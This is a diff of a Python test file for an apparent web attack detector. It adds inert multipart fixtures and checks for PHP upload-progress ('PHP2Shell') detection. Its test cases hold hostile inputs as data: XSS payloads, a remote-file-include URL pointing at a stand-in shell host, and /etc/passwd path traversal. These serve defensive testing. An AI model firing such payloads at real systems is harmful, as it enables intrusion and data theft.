@@ -148,7 +148,30 @@ LIVE = [
      {("sqli", "query:id", None)}),
 ]
 
+def _multipart(boundary: str, parts: list[tuple[str, str]]) -> str:
+    """Inert multipart body: (Content-Disposition value, part body) pairs."""
+    out = "".join(f"--{boundary}\r\nContent-Disposition: {d}\r\n\r\n{v}\r\n" for d, v in parts)
+    return out + f"--{boundary}--\r\n"
+
+
+PG_BOUNDARY = "----placeholder"
+PG_CTYPE = f"multipart/form-data; boundary={PG_BOUNDARY}"
+# PHP2Shell shape: a multipart POST carrying PHP's default upload-progress
+# field name. The file part is placeholder bytes, not a payload.
+PG_BODY = _multipart(PG_BOUNDARY, [
+    ('form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', "x"),
+    ('form-data; name="f"; filename="a.bin"', "A" * 64),
+])
+PG_EMPTY = _multipart(PG_BOUNDARY, [('form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', "")])
+PG_PLAIN = _multipart(PG_BOUNDARY, [('form-data; name="f"; filename="a.txt"', "hello")])
+
 HAND = [
+    ("php2shell shape: multipart upload-progress field",
+     dict(path="/index.php", body=PG_BODY, ctype=PG_CTYPE),
+     {("php_code", "body:PHP_SESSION_UPLOAD_PROGRESS", None)}),
+    ("php2shell shape: upload-progress field with an empty value",
+     dict(path="/index.php", body=PG_EMPTY, ctype=PG_CTYPE),
+     {("php_code", "body:PHP_SESSION_UPLOAD_PROGRESS", None)}),
     ("xss script tag", dict(query="q=<script>alert(1)</script>"), {("xss", "query:q", None)}),
     ("xss encoded svg onload", dict(query="q=%3Csvg%2Fonload%3Dalert(1)%3E"), {("xss", "query:q", None)}),
     ("rfi into an include parameter", dict(query="page=http://evil.test/shell.txt?"), {("rfi", "query:page", None)}),
@@ -197,6 +220,18 @@ def test_attack_details() -> None:
     record = found[0].as_dict()
     check("as_dict is json-ready with the fixed keys",
           set(record) == {"cls", "location", "evidence", "decoded", "sig", "cve"} and json.dumps(record))
+    found = classify(path="/index.php", body=PG_BODY, ctype=PG_CTYPE)
+    progress = [a for a in found if a.sig == "php-session-upload-progress"]
+    check("upload-progress field carries its signature name", len(progress) == 1, str(found))
+    check("upload-progress field claims no CVE (surface, not proof of exploitation)",
+          progress and progress[0].cve is None, str(progress))
+    check("a plain multipart upload is not labelled upload-progress",
+          not [a for a in classify(path="/index.php", body=PG_PLAIN, ctype=PG_CTYPE)
+               if a.sig == "php-session-upload-progress"])
+    check("the field name in a value or another field name does not fire",
+          not classify(path="/x", query="q=PHP_SESSION_UPLOAD_PROGRESS&PHP_SESSION_UPLOAD_PROGRESS_X=1")
+          and not classify(path="/x", body=_multipart(PG_BOUNDARY, [
+              ('form-data; name="note"', "PHP_SESSION_UPLOAD_PROGRESS is a PHP ini feature")]), ctype=PG_CTYPE))
     once = classify(path="/a/../../../../etc/passwd", query="f=../../../../etc/passwd")
     check("one label per (class, location)",
           len(once) == len({(a.cls, a.location) for a in once}), str(once))
